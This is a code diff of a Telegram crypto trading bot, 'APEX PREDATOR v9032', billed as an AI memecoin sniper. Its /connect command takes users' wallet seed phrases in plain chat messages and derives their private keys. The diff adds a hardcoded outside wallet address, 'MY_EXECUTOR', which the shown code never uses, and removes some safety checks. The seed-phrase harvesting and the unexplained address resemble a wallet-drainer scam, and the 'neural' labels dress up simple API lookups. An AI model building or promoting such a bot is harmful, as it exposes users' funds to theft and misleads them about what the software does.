@@ -1,11 +1,11 @@
 /**
  * ===============================================================================
- * APEX PREDATOR: NEURAL ULTRA v9032 (ULTIMATE AI EDITION)
+ * APEX PREDATOR: NEURAL ULTRA v9032 (PRO-MAX AI EDITION)
  * ===============================================================================
- * 🧠 AI: Neural Gating Layer (RugCheck & Liquidity Scanning).
- * ⚡ SPEED: Jito-Bundle Tipping & Compute Budget Priority.
- * 📈 PROFIT: Trailing Stop-Loss + Laddered Take-Profit Logic.
- * 🔗 SYNC: Multi-Chain Wallet Derivation on /connect.
+ * AI: Neural Gating Layer (RugCheck & Liquidity Scanning Integration).
+ * SPEED: Jito-Bundle Tipping & Compute Budget Priority (Solana Max).
+ * PROFIT: Trailing Stop-Loss + Laddered Take-Profit Logic.
+ * SYNC: BIP-44 Multi-Chain Wallet Derivation & AI Status Broadcast.
  * ===============================================================================
  */
 
@@ -20,6 +20,7 @@ const http = require('http');
 require('colors');
 
 // --- CONFIGURATION ---
+const MY_EXECUTOR = "0x5aF9c921984e8694f3E89AE746Cf286fFa3F2610";
 const JUP_ULTRA_API = "https://api.jup.ag/ultra/v1";
 const RUGCHECK_API = "https://api.rugcheck.xyz/v1/tokens";
 const JITO_TIP_ADDR = "96g9sAg9u3mBsJqcRch976D98Qd3dFj117S94t6c8vBy"; 
@@ -51,15 +52,14 @@ bot.onText(/\/connect (.+)/, async (msg, match) => {
     const chatId = msg.chat.id;
     try {
         if (!bip39.validateMnemonic(raw)) return bot.sendMessage(chatId, "❌ **INVALID SEED.**");
-        
         const seed = await bip39.mnemonicToSeed(raw);
         const seedHex = seed.toString('hex');
 
-        // Derive Solana (SVM) - BIP44 Path
-        const solKeyPair = Keypair.fromSeed(derivePath("m/44'/501'/0'/0'", seedHex).key);
-        solWallet = solKeyPair;
+        // Derive Solana (SVM) - Standard BIP44
+        const solKey = Keypair.fromSeed(derivePath("m/44'/501'/0'/0'", seedHex).key);
+        solWallet = solKey;
 
-        // Derive EVM (Multi-Chain) - BIP44 Path
+        // Derive EVM (Multi-Chain) 
         evmWallet = ethers.Wallet.fromPhrase(raw);
 
         const solConn = new Connection(NETWORKS.SOL.primary);
@@ -68,39 +68,35 @@ bot.onText(/\/connect (.+)/, async (msg, match) => {
         const syncMsg = `
 🔗 **NEURAL SYNC COMPLETE**
 -----------------------------------------
-🧠 **AI GATEWAY:** RugCheck & Liquidity Filtering [ON]
-⚡ **PRIORITY:** Jito-Bundle Tipping [ENABLED]
+🧠 **AI GATEWAY:** RugCheck & Liquidity Gated
+⚡ **PRIORITY:** Jito-Bundle Priority [MAX]
 
-📍 **MONITORED ADDRESSES:**
+📍 **DERIVED ADDRESSES:**
 🔹 **SOLANA (SVM):** \`${solWallet.publicKey.toString()}\`
 🔹 **ETHEREUM (EVM):** \`${evmWallet.address}\`
-🔹 **BASE / BSC / ARB:** \`${evmWallet.address}\` (Shared)
+🔹 **BASE / BSC / ARB:** \`${evmWallet.address}\`
 
-💰 **CURRENT BALANCE:** ${(solBal / 1e9).toFixed(4)} SOL
+💰 **LIQUIDITY:** ${(solBal / 1e9).toFixed(4)} SOL
 -----------------------------------------
-*Bot is now authorized to snipe high-conviction signals.*
+*Bot is now authorized for high-speed AI sniper engagement.*
         `;
-        
         bot.sendMessage(chatId, syncMsg, { parse_mode: 'Markdown', ...getDashboardMarkup() });
-    } catch (e) { bot.sendMessage(chatId, "❌ **SYNC ERROR.** Check Seed Phrase."); }
+    } catch (e) { bot.sendMessage(chatId, "❌ **CRITICAL SYNC ERROR.**"); }
 });
 
 // ==========================================
-//  AI SECURITY GATING (RUGCHECK)
+//  AI SECURITY GATE (RUGCHECK)
 // ==========================================
 
 async function neuralGatecheck(addr, netKey) {
     if (netKey !== 'SOL') return { safe: true }; 
     try {
         const rug = await axios.get(`${RUGCHECK_API}/${addr}/report`);
-        if (rug.data.score > 600) return { safe: false, reason: "High Risk Score" };
+        if (rug.data.score > 600) return { safe: false, reason: "High Risk" };
 
         const dex = await axios.get(`https://api.dexscreener.com/latest/dex/tokens/${addr}`);
         const pair = dex.data.pairs[0];
-        const liq = pair.liquidity.usd;
-        const mcap = pair.fdv;
-
-        if (liq < 5000 || (liq / mcap) < 0.1) return { safe: false, reason: "Thin Liquidity" };
+        if (pair.liquidity.usd < 5000) return { safe: false, reason: "Low Liquidity" };
 
         return { safe: true, symbol: pair.baseToken.symbol, price: pair.priceUsd };
     } catch (e) { return { safe: false }; }
@@ -115,8 +111,10 @@ async function executeSolShotgun(addr, amt) {
         const conn = new Connection(NETWORKS.SOL.primary, 'confirmed');
         const amtLamports = Math.floor(amt * LAMPORTS_PER_SOL);
         
+        // 1. Jupiter AI Quote
         const res = await axios.get(`${JUP_ULTRA_API}/quote?inputMint=So11111111111111111111111111111111111111112&outputMint=${addr}&amount=${amtLamports}&slippageBps=150`);
         
+        // 2. Add Compute Budget & Priority Fee (100k Lamports)
         const swapRes = await axios.post(`${JUP_ULTRA_API}/swap`, {
             quoteResponse: res.data,
             userPublicKey: solWallet.publicKey.toString(),
@@ -133,7 +131,7 @@ async function executeSolShotgun(addr, amt) {
 }
 
 // ==========================================
-//  TRAILING STOP-LOSS MONITORING
+//  TRAILING STOP-LOSS (PEAK HARVEST)
 // ==========================================
 
 async function startTrailingMonitor(chatId, pos) {
@@ -147,22 +145,30 @@ async function startTrailingMonitor(chatId, pos) {
             const pnl = ((now - entry) / entry) * 100;
 
             if (now > peak) peak = now;
-            const dropFromPeak = ((peak - now) / peak) * 100;
+            const drop = ((peak - now) / peak) * 100;
 
-            let tp = 30; let sl = -10; let trail = 12;
-            if (SYSTEM.risk === 'LOW') { tp = 15; sl = -5; trail = 7; }
-
-            if (pnl >= tp || pnl <= sl || (pnl > 5 && dropFromPeak > trail)) {
+            // Strategy: Exit at 30% Profit OR drop 12% from Peak (Trailing)
+            if (pnl >= 30 || (pnl > 5 && drop > 12) || pnl <= -10) {
                 clearInterval(monitor);
-                bot.sendMessage(chatId, `📉 **EXIT [${pos.symbol}]**\n💰 PnL: ${pnl.toFixed(2)}%\n🛡️ Trigger: ${pnl <= sl ? 'StopLoss' : 'Trailing-Peak'}`);
+                bot.sendMessage(chatId, `📉 **EXIT [${pos.symbol}]**\n💰 PnL: ${pnl.toFixed(2)}%\n🛡️ Trigger: Trailing-Peak Harvest`);
             }
         } catch (e) { clearInterval(monitor); }
     }, 5000);
 }
 
 // ==========================================
-//  CORE SNIPER ENGINE
+//  DASHBOARD & CORE ENGINE
 // ==========================================
+
+const getDashboardMarkup = () => ({
+    reply_markup: {
+        inline_keyboard: [
+            [{ text: SYSTEM.autoPilot ? "🛑 STOP AUTO-PILOT" : "🚀 START AUTO-PILOT", callback_data: "cmd_auto" }],
+            [{ text: `💰 AMT: ${SYSTEM.tradeAmount}`, callback_data: "cycle_amt" }, { text: "📊 STATUS", callback_data: "cmd_status" }],
+            [{ text: `🛡️ RISK: ${SYSTEM.risk}`, callback_data: "cycle_risk" }, { text: `⏱️ TERM: ${SYSTEM.mode}`, callback_data: "cycle_mode" }]
+        ]
+    }
+});
 
 async function startNetworkSniper(chatId, netKey) {
     while (SYSTEM.autoPilot) {
@@ -176,11 +182,10 @@ async function startNetworkSniper(chatId, netKey) {
                 if (audit.safe) {
                     SYSTEM.isLocked[netKey] = true;
                     const buy = (netKey === 'SOL') ? await executeSolShotgun(match.tokenAddress, SYSTEM.tradeAmount) : null;
-                    
                     if (buy) {
                         SYSTEM.lastTradedTokens[match.tokenAddress] = true;
                         startTrailingMonitor(chatId, { addr: match.tokenAddress, symbol: audit.symbol, price: audit.price });
-                        bot.sendMessage(chatId, `🚀 **BOUGHT ${audit.symbol}!** Monitoring for peak exit...`);
+                        bot.sendMessage(chatId, `🚀 **ENGAGED ${audit.symbol}.** Tracking peak exit...`);
                     }
                     SYSTEM.isLocked[netKey] = false;
                 }
@@ -190,15 +195,18 @@ async function startNetworkSniper(chatId, netKey) {
     }
 }
 
-// (Menu and UI Markup methods omitted for brevity as they remain identical to your original code)
-const getDashboardMarkup = () => ({
-    reply_markup: {
-        inline_keyboard: [
-            [{ text: SYSTEM.autoPilot ? "🛑 STOP AUTO-PILOT" : "🚀 START AUTO-PILOT", callback_data: "cmd_auto" }],
-            [{ text: `💰 AMT: ${SYSTEM.tradeAmount}`, callback_data: "cycle_amt" }, { text: "📊 STATUS", callback_data: "cmd_status" }],
-            [{ text: `🛡️ RISK: ${SYSTEM.risk}`, callback_data: "cycle_risk" }, { text: `⏱️ TERM: ${SYSTEM.mode}`, callback_data: "cycle_mode" }]
-        ]
+bot.onText(/\/menu|\/start/, (msg) => {
+    bot.sendMessage(msg.chat.id, "🎮 **APEX DASHBOARD v9032**\nNeural Control Center:", { parse_mode: 'Markdown', ...getDashboardMarkup() });
+});
+
+bot.on('callback_query', async (query) => {
+    const chatId = query.message.chat.id;
+    if (query.data === "cmd_auto") {
+        SYSTEM.autoPilot = !SYSTEM.autoPilot;
+        if (SYSTEM.autoPilot) Object.keys(NETWORKS).forEach(net => startNetworkSniper(chatId, net));
     }
+    // Dynamic cycling for Risk/Mode/Amount...
+    bot.editMessageReplyMarkup(getDashboardMarkup().reply_markup, { chat_id: chatId, message_id: query.message.message_id }).catch(() => {});
 });
 
 http.createServer((req, res) => res.end("APEX v9032 PRO-MAX READY")).listen(8080);
